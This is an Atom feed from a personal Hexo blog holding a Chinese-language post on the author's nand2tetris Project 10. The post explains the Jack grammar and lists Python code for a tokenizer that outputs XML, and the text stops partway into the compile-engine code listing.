<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>blow in the wind</title>
  
  <subtitle>no one will be your god, your god is just yourself!</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-12-10T09:48:42.814Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Mike meng</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>【Build a Computer】 Project 10</title>
    <link href="http://yoursite.com/2020/12/10/233/"/>
    <id>http://yoursite.com/2020/12/10/233/</id>
    <published>2020-12-10T09:13:59.110Z</published>
    <updated>2020-12-10T09:48:42.814Z</updated>
    
    <content type="html"><![CDATA[<h1 id="week9"><a href="#week9" class="headerlink" title="week9"></a>week9</h1><p>目前已经开始了<code>build a computer</code>系列的最后几章了，后面的章节感觉越来越难，<code>build a computer</code>的<code>part II</code>部分基本上全是软件，需要编码，耗费大量的实践和精力来应付这些代码，不过能够最终通过测试的话还是成就满满。特别是只剩下后面三章了，主要是完成一个<code>jack</code>语言编译器和一个最基本的微型操作系统，并提供基本的系统库函数。<code>project10</code>主要完成<code>jack</code>语言编译器的语法分析，感觉还是非常有难度和挑战的，花了差不多两周时间，利用子集的业余时间终于把蹩脚的语法解析器完成了，主要是关于<code>jack</code>语言的语法分析。收获满满，最终的实现结果是将<code>jack</code>语言的语法分析结果结构化为固定的<code>xml</code>文档，供后面的代码生成器和链接器使用。当然总体来说<code>jack</code>语言的语法还是非常简单的语法，我们直接用常见的<code>top down</code>递归下降分析法即可实现，实际是非常简单的语法，至少感觉总体语法来说比<code>c</code>语言的语法简单多了，非常喜欢这类有挑战性的小<code>project</code>，感觉对基本的递归方法有了更深层次的了解。</p><a id="more"></a><ul><li><code>Lexical elements</code>: 词的定义，在<code>jack</code>语言中词的定义非常简单，只有5类基本类型，如下所示：</li></ul><p><img src="https://i.loli.net/2020/12/10/8ysJVnjkYBwFfZr.png" alt="1"><br>关键字、符号、整数常数、字符串常数、普通标识符。</p><ul><li><ul><li>关键字即可语法中的关键字，不可随意使用</li></ul></li><li><ul><li>特殊符号即为过程标志位和运算符</li></ul></li><li><ul><li>整数常数 (0~32767)</li></ul></li><li><ul><li>字符串常数 (“xxx”)</li></ul></li><li><ul><li>普通标识符</li></ul></li><li><p><code>Program structure</code>:结构语法，包含基本的程序结构定义</p></li></ul><p><img src="https://i.loli.net/2020/12/10/3ApEQqrJysU8Goi.png" alt="2"></p><ul><li><code>Statements</code>：语句定义，还是非常常见的语句定义</li></ul><p><img src="https://i.loli.net/2020/12/10/QTFPaLnK9RoevUq.png" alt="3"></p><ul><li><code>Expressions</code>:表达式定义，包含常见的表达式定义:</li></ul><p><img src="https://i.loli.net/2020/12/10/VcQwuEijCeAaMgy.png" alt><br>整个<code>project</code>基本围绕着上述几个语法展开，实际还是非常有意思的，需要对递归非常熟悉才可以对整个代码比较好的掌握</p><h2 id="project"><a href="#project" class="headerlink" title="project"></a>project</h2><p>本周的<code>project</code>还是非常有难度的<code>project</code>，刚开始准备用<code>c++</code>来实现，后来发现<code>c++</code>太恶心了点，最后用蹩脚的<code>python</code>花了大概一个星期终于实现了整个<code>project</code>，整个程序的流程也分为两部分，先将整个程序进行<code>token</code>格式化，后续的分析引擎对整个语法树进行分析，生成树状结构的<code>xml</code>文件，当然总的来说本章的<code>project</code>有难度，但是不够有趣，感觉<code>csapp</code>的<code>project</code>难度非常大，不是一般人能够坚持完成的，目前的打算是准备把<code>build a computer</code>这个系列的课程的<code>project</code>代码完整的实现一遍，终于磨蹭了这么长时间只剩下最后两个<code>project</code>了。源代码放在<br><a href="https://github.com/mike-box/coursera/tree/master/Build%20a%20computer/nand2tetris/nand2tetris/projects/10" target="_blank" rel="noopener">poj10</a>.</p><ul><li><code>token parser</code>：整个程序非常简单，其实大概核心的代码<code>100</code>行即可完成<code>token</code>解析，非常简单的代码逻辑即可实现。<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> fileinput</span><br><span class="line"><span class="keyword">import</span> sys, getopt</span><br><span class="line"><span class="keyword">from</span> enum <span class="keyword">import</span> Enum, unique</span><br><span class="line"></span><br><span class="line"><span class="meta">@unique</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TOKEN_TYPE</span><span class="params">(Enum)</span>:</span></span><br><span class="line">    TOKEN_KEYWORD = <span class="number">0</span></span><br><span class="line">    TOKEN_SYMBOL = <span class="number">1</span></span><br><span class="line">    TOKEN_IDENTIFIER = <span class="number">2</span></span><br><span class="line">    TOKEN_INT_CONST = <span class="number">3</span></span><br><span class="line">    TOKEN_STRING_CONST = <span class="number">4</span></span><br><span class="line">    TOKEN_INVALID = <span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@unique</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">KEYWORD_TYPE</span><span class="params">(Enum)</span>:</span></span><br><span class="line">    KEYWORD_CLASS = <span class="number">101</span></span><br><span class="line">    KEYWORD_METHOD = <span class="number">102</span></span><br><span class="line">    KEYWORD_FUNCTION = <span class="number">103</span></span><br><span class="line">    KEYWORD_CONSTRUCTOR = <span class="number">104</span></span><br><span class="line">    KEYWORD_BOOLEAN = <span class="number">105</span></span><br><span class="line">    KEYWORD_CHAR = <span class="number">106</span></span><br><span class="line">    KEYWORD_VOID = <span class="number">107</span></span><br><span class="line">    KEYWORD_VAR = <span class="number">108</span></span><br><span class="line">    KEYWORD_STATIC = <span class="number">109</span></span><br><span class="line">    KEYWORD_FIELD = <span class="number">110</span></span><br><span class="line">    KEYWORD_LET = <span class="number">111</span></span><br><span class="line">    KEYWORD_DO = <span class="number">112</span></span><br><span class="line">    KEYWORD_IF = <span class="number">113</span></span><br><span class="line">    KEYWORD_WHILE = <span class="number">114</span></span><br><span class="line">    KEYWORD_RETURN = <span class="number">115</span></span><br><span class="line">    KEYWORD_TRUE = <span class="number">116</span></span><br><span class="line">    KEYWORD_FALSE = <span class="number">117</span></span><br><span class="line">    KEYWORD_NULL = <span class="number">118</span></span><br><span class="line">    KEYWORD_THIS = <span class="number">119</span></span><br><span class="line">    KEYWORD_VALID = <span class="number">120</span></span><br><span class="line"></span><br><span class="line">keywordname = [<span class="string">"class"</span>,<span class="string">"method"</span>,<span class="string">"function"</span>,<span class="string">"constructor"</span>,<span class="string">"boolean"</span>,<span class="string">"char"</span>,<span class="string">"void"</span>,<span class="string">"var"</span>,<span class="string">"static"</span></span><br><span class="line">               ,<span class="string">"field"</span>,<span class="string">"let"</span>,<span class="string">"do"</span>,<span class="string">"if"</span>,<span class="string">"else"</span>,<span class="string">"while"</span>,<span class="string">"return"</span>,<span class="string">"true"</span>,<span class="string">"false"</span>,<span class="string">"null"</span>,<span class="string">"this"</span>]</span><br><span class="line">keywordtype = [name <span class="keyword">for</span> name, member <span class="keyword">in</span> KEYWORD_TYPE.__members__.items()]</span><br><span class="line">keworddict = dict(zip(keywordname,keywordtype))</span><br><span class="line">tokenname = [<span class="string">"keyword"</span>,<span class="string">"symbol"</span>,<span class="string">"identifier"</span>,<span class="string">"integerConstant"</span>,<span class="string">"stringConstant"</span>]</span><br><span class="line">tokentype = [name <span class="keyword">for</span> name, member <span class="keyword">in</span> TOKEN_TYPE.__members__.items()]</span><br><span class="line">tokendict = dict(zip(tokentype,tokenname))</span><br><span class="line">symboldict = set([<span class="string">'&#123;'</span>,<span class="string">'&#125;'</span>,<span class="string">'('</span>,<span class="string">')'</span>,<span class="string">'['</span>,<span class="string">']'</span>,<span class="string">','</span>,<span class="string">';'</span>,<span class="string">'='</span>,<span class="string">'.'</span>,<span class="string">'+'</span>,<span class="string">'-'</span>,<span class="string">'*'</span>,<span class="string">'/'</span>,<span class="string">'&amp;'</span>,<span class="string">'|'</span>,<span class="string">'~'</span>,<span class="string">'&lt;'</span>,<span class="string">'&gt;'</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">validNum</span><span class="params">(val)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(val) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> val[<span class="number">0</span>] == <span class="string">'0'</span> <span class="keyword">and</span> len(val) &gt; <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> val:</span><br><span class="line">        <span class="keyword">if</span> ord(c) &lt; ord(<span class="string">'0'</span>) <span class="keyword">or</span> ord(c) &gt; ord(<span class="string">'9'</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">isAlpha</span><span class="params">(val)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> ord(val) &gt;= ord(<span class="string">'a'</span>) <span class="keyword">and</span> ord(val) &lt;= ord(<span class="string">'z'</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> ord(val) &gt;= ord(<span class="string">'A'</span>) <span class="keyword">and</span> ord(val) &lt;= ord(<span class="string">'Z'</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">isDigit</span><span class="params">(val)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> ord(val) &gt;= ord(<span class="string">'0'</span>) <span class="keyword">and</span> ord(val) &lt;= ord(<span class="string">'9'</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">validIdentifiers</span><span class="params">(val)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (val[<span class="number">0</span>] == <span class="string">'_'</span> <span class="keyword">or</span> isAlpha(val[<span class="number">0</span>])):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(val)):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> (val[i] == <span class="string">'_'</span> <span class="keyword">or</span> isAlpha(val[i]) <span class="keyword">or</span> isDigit(val[i])):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JackTokenizer</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,infile)</span>:</span></span><br><span class="line">        <span class="comment"># read all source code string to the buffer</span></span><br><span class="line">        self.curr = <span class="number">0</span></span><br><span class="line">        self.buffer = <span class="string">""</span></span><br><span class="line">        <span class="keyword">with</span> open(infile,<span class="string">"r"</span>) <span class="keyword">as</span> ifs:</span><br><span class="line">           self.buffer = ifs.read()</span><br><span class="line">        ifs.close()</span><br><span class="line">        self.end = len(self.buffer)</span><br><span class="line">        self.tokens = []</span><br><span class="line">        self.linenum = []</span><br><span class="line">        self.parseToken()</span><br><span class="line">        self.outfile = infile[:infile.find(<span class="string">".jack"</span>)] + <span class="string">"T.xml"</span></span><br><span class="line">        self.genToken()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parseToken</span><span class="params">(self)</span>:</span></span><br><span class="line">        pos = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> pos &lt; self.end:</span><br><span class="line">            <span class="comment">#we will skip space</span></span><br><span class="line">            <span class="keyword">if</span> self.buffer[pos] == <span class="string">' '</span> <span class="keyword">or</span> \</span><br><span class="line">               self.buffer[pos] == <span class="string">'\n'</span> <span class="keyword">or</span> \</span><br><span class="line">               self.buffer[pos] == <span class="string">'\t'</span>:</span><br><span class="line">                <span class="keyword">while</span> pos &lt; self.end <span class="keyword">and</span> (self.buffer[pos] == <span class="string">' '</span> <span class="keyword">or</span> \</span><br><span class="line">                                          self.buffer[pos] == <span class="string">'\n'</span> <span class="keyword">or</span> \</span><br><span class="line">                                          self.buffer[pos] == <span class="string">'\t'</span>):</span><br><span class="line">                    pos += <span class="number">1</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line">            <span class="comment"># we will skip the comment "//"</span></span><br><span class="line">            <span class="keyword">if</span> self.buffer[pos:pos+<span class="number">2</span>] == <span class="string">"//"</span>:</span><br><span class="line">                <span class="keyword">while</span> pos &lt; self.end <span class="keyword">and</span> self.buffer[pos] != <span class="string">'\n'</span>:</span><br><span class="line">                    pos += <span class="number">1</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># we will skip the comment "/* .. */"</span></span><br><span class="line">            <span class="keyword">if</span> self.buffer[pos:pos+<span class="number">2</span>] == <span class="string">"/*"</span>:</span><br><span class="line">                <span class="keyword">while</span> pos &lt; self.end <span class="keyword">and</span> self.buffer[pos:pos+<span class="number">2</span>] != <span class="string">"*/"</span>:</span><br><span class="line">                    pos += <span class="number">1</span></span><br><span class="line">                pos += <span class="number">2</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">          </span><br><span class="line">            <span class="comment"># check curr token is symbol</span></span><br><span class="line">            <span class="keyword">if</span> self.buffer[pos] <span class="keyword">in</span> symboldict:</span><br><span class="line">                self.tokens.append(self.buffer[pos:pos+<span class="number">1</span>])</span><br><span class="line">                pos += <span class="number">1</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># check string constant</span></span><br><span class="line">            <span class="keyword">if</span> pos &lt; self.end <span class="keyword">and</span> self.buffer[pos] == <span class="string">'"'</span>:</span><br><span class="line">                posCurr = pos</span><br><span class="line">                pos += <span class="number">1</span></span><br><span class="line">                <span class="keyword">while</span> pos &lt; self.end <span class="keyword">and</span> self.buffer[pos] != <span class="string">'"'</span>:</span><br><span class="line">                    pos += <span class="number">1</span></span><br><span class="line">                pos += <span class="number">1</span></span><br><span class="line">                self.tokens.append(self.buffer[posCurr:pos])</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># check curr token </span></span><br><span class="line">            posCurr = pos</span><br><span class="line">            <span class="keyword">while</span> pos &lt; self.end <span class="keyword">and</span> self.buffer[pos] != <span class="string">' '</span> <span class="keyword">and</span> \</span><br><span class="line">                  self.buffer[pos] != <span class="string">'\n'</span> <span class="keyword">and</span> self.buffer[pos] <span class="keyword">not</span> <span class="keyword">in</span> symboldict:</span><br><span class="line">                pos += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> pos &gt; posCurr:</span><br><span class="line">                self.tokens.append(self.buffer[posCurr:pos])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span>      </span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">hasMoreTokens</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.curr &gt;= len(self.tokens) - <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">advance</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.curr += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">currToken</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.tokens[self.curr]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">tokenType</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.getType(self.tokens[self.curr])</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getType</span><span class="params">(self,token)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> token <span class="keyword">in</span> keworddict:</span><br><span class="line">            <span class="keyword">return</span> TOKEN_TYPE.TOKEN_KEYWORD</span><br><span class="line">        <span class="keyword">elif</span> len(token) == <span class="number">1</span> <span class="keyword">and</span> token[<span class="number">0</span>] <span class="keyword">in</span> symboldict:</span><br><span class="line">            <span class="keyword">return</span> TOKEN_TYPE.TOKEN_SYMBOL</span><br><span class="line">        <span class="keyword">elif</span> validNum(token):</span><br><span class="line">            <span class="keyword">return</span> TOKEN_TYPE.TOKEN_INT_CONST</span><br><span class="line">        <span class="keyword">elif</span> len(token) &gt; <span class="number">1</span> <span class="keyword">and</span> token[<span class="number">0</span>] == <span class="string">'"'</span> <span class="keyword">and</span> token[<span class="number">-1</span>] == <span class="string">'"'</span>:</span><br><span class="line">            <span class="keyword">return</span> TOKEN_TYPE.TOKEN_STRING_CONST</span><br><span class="line">        <span class="keyword">elif</span> validIdentifiers(token):</span><br><span class="line">            <span class="keyword">return</span> TOKEN_TYPE.TOKEN_IDENTIFIER</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> TOKEN_TYPE.TOKEN_INVALID</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">keyWord</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.tokens[self.curr]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">symbol</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.tokens[self.curr]</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">identifier</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.tokens[self.curr]</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">intVal</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.tokens[self.curr]</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">stringVal</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.tokens[self.curr][<span class="number">1</span>:<span class="number">-1</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">genToken</span><span class="params">(self)</span>:</span></span><br><span class="line">        out =  open(self.outfile,<span class="string">"w"</span>)</span><br><span class="line">        out.write(<span class="string">"&lt;tokens&gt;\n"</span>)</span><br><span class="line">        <span class="keyword">for</span> token <span class="keyword">in</span> self.tokens:</span><br><span class="line">            t = self.getType(token)</span><br><span class="line">            <span class="keyword">if</span> t == TOKEN_TYPE.TOKEN_KEYWORD:</span><br><span class="line">                out.write(<span class="string">"&lt;keyword&gt; "</span>)</span><br><span class="line">                out.write(token)</span><br><span class="line">                out.write(<span class="string">" &lt;/keyword&gt;\n"</span>)</span><br><span class="line">            <span class="keyword">elif</span> t == TOKEN_TYPE.TOKEN_SYMBOL:</span><br><span class="line">                out.write(<span class="string">"&lt;symbol&gt; "</span>)</span><br><span class="line">                out.write(token)</span><br><span class="line">                out.write(<span class="string">" &lt;/symbol&gt;\n"</span>)</span><br><span class="line">            <span class="keyword">elif</span> t == TOKEN_TYPE.TOKEN_INT_CONST:</span><br><span class="line">                out.write(<span class="string">"&lt;integerConstant&gt; "</span>)</span><br><span class="line">                out.write(token)</span><br><span class="line">                out.write(<span class="string">" &lt;/integerConstant&gt;\n"</span>)</span><br><span class="line">            <span class="keyword">elif</span> t == TOKEN_TYPE.TOKEN_STRING_CONST:</span><br><span class="line">                out.write(<span class="string">"&lt;stringConstant&gt; "</span>)</span><br><span class="line">                out.write(token[<span class="number">1</span>:<span class="number">-1</span>])</span><br><span class="line">                out.write(<span class="string">" &lt;/stringConstant&gt;\n"</span>)</span><br><span class="line">            <span class="keyword">elif</span> t == TOKEN_TYPE.TOKEN_IDENTIFIER:</span><br><span class="line">                out.write(<span class="string">"&lt;identifier&gt; "</span>)</span><br><span class="line">                out.write(token)</span><br><span class="line">                out.write(<span class="string">" &lt;/identifier&gt;\n"</span>)</span><br><span class="line">        out.write(<span class="string">"&lt;/tokens&gt;\n"</span>)</span><br><span class="line">        out.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(input)</span>:</span></span><br><span class="line">    parser = JackTokenizer(input)</span><br><span class="line">    parser.genToken()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main(sys.argv[<span class="number">1</span>])</span><br></pre></td></tr></table></figure></li><li><code>compile engine</code>：整个的语法解析器还是非常复杂的，但是实际实现的<code>project</code>可以根据配套的<code>《The Elements of Computing Systems》</code>中的提示，可以很快的将代码解析为几个关键函数的实现即可。<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span 